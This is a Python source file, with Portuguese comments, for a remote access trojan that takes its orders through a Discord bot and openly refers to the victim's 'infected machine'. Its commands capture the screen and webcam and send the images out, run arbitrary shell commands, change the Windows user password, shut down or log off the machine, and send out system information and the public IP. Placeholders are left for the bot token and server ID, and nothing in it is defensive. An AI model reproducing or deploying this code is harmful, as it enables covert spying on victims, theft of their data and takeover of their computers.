import discord
from discord.ext import commands
import requests
import os
import getpass
from PIL import ImageGrab
import ctypes
import cv2
from string import ascii_lowercase, digits
from random import choices

admin = ctypes.windll.shell32.IsUserAnAdmin()
userprofile = getpass.getuser()
maquina = os.getenv('COMPUTERNAME')
guild_id = 000000000000000000000 # ID DO SERVIDOR AQUIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
def cls():
    os.system("cls")
    
TOKEN = "TOKEN AQUI" # COLOQUE O TOKEN DO BOT AQUIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)


@bot.event
async def on_ready():
    global channel
    cls()
    
    guild = bot.get_guild(guild_id)
    channel = discord.utils.get(guild.text_channels, name=maquina.lower())

    if not channel:
        channel = await guild.create_text_channel(name=maquina.lower())

    if not admin:
        await channel.send("***⚠️ SEM PRIVILEGIOS DE ADMINISTRADOR***")
    else:
        await channel.send("***✅ PRIVILEGIOS DE ADMINISTRADOR APLICADOS***")
    await channel.send(f"***✅ CONEXÃO ESTABELECIDA AO COMPUTADOR `{maquina}`***")
    
@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="COMANDOS DO VAIRUS",
        description=
        """***>screenshot -> Faz uma captura de tela da maquina infectada;***
        ***>camshot -> Faz uma captura da webcam da maquina infectada;***
        ***>shutdown -> Desliga instantaneamente a maquina infectada;***
        ***>cgpass <password> -> Muda a senha do usuário (Não coloque caracteres especiais ou espaços);***
        ***>unuser -> Desconecta o usuário;***
        ***>cmd <command> -> Manda um comando via prompt para a maquina infectada;***
        ***>getinfo -> Pega as informações da maquina infectada (Isso abre o CMD por 3 segundos...)***
        """,
        color=discord.Color.blurple()
    )
    embed.set_footer(text="BY NOKEIC, NEGATIVE ZERO")
    await ctx.send(embed=embed)

@bot.command()
async def screenshot(ctx):
    if ctx.channel.id != channel.id:
        return
    try:
        screenshot = ImageGrab.grab()
        temp_path = os.path.join(os.getenv("TEMP"), "shot.png")
        screenshot.save(temp_path)
        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)

    except Exception as e:
        await ctx.send(f"Erro no screenshot: {e}")

@bot.command()
async def camshot(ctx):
    if ctx.channel.id != channel.id:
        return
    
    try:
        cam = cv2.VideoCapture(0)
        
        if not cam.isOpened():
            await ctx.send("**❌ A webcam não pôde ser acessada.**")
            return

        ret, frame = cam.read()
        cam.release()
        
        if ret:
            temp_path = os.path.join(os.getenv("TEMP"), "cam.png")
            cv2.imwrite(temp_path, frame)
            await ctx.send(file=discord.File(temp_path))

    except Exception as e:
        await ctx.send(str(e))
        cam.release()

@bot.command()
async def shutdown(ctx):
    try:
        await ctx.send("Teste o comando **spyshot** para saber se o comando funcionou.")
        os.system("shutdown /p")
    except OSError as o:
        await ctx.send(f"OCORREU UM ERRO: {o}")

@bot.command()
async def cgpass(ctx, *, password: str):
    try:
        os.system(f"net user {userprofile} {password}")
        await ctx.send(f"A senha do usuário {userprofile} foi alterada com sucesso!")
    except Exception as e:
        await ctx.send(f"OCORREU UM ERRO (OBS: NÃO UTILIZE ESPAÇOS E CARACTERES ESPECIAIS): {e}")

@bot.command()
async def unuser(ctx):
    try:
        os.system("shutdown /l")
        await ctx.send("Usuario desconectado com sucesso!")
    except Exception as e:
        await ctx.send(f"OCORREU UM ERRO: {e}")

@bot.command()
async def cmd(ctx, *, command):
    try:
        os.system(command)
        await ctx.send("Comando executado com sucesso!")
    except Exception as e:
        await ctx.send(f"OCORREU UM ERRO: {e}")
    
@bot.command()
async def getinfo(ctx):
    caracteres = ascii_lowercase + digits
    arq = ''.join(choices(caracteres, k=50))

    path = rf"C:\Windows\Temp\{arq}.txt"
    
    os.system(f"systeminfo > \"{path}\" 2> nul")
    await ctx.send(file=discord.File(path))
    await ctx.send(f"***USERPROFILE: `{userprofile}`***")
    response = requests.get('https://api.ipify.org')
    public_ip = response.text
    await ctx.send(f"***PUBLIC IP ADRESS***: ||``{public_ip}``||")
    os.system(f'del "{path}"')


bot.run(token=TOKEN) # PROGRAMADO POR NOKEIC, NEGATIVE ZERO (POR FAVOR NÃO REMOVA OS CREDITOS 😓😭)
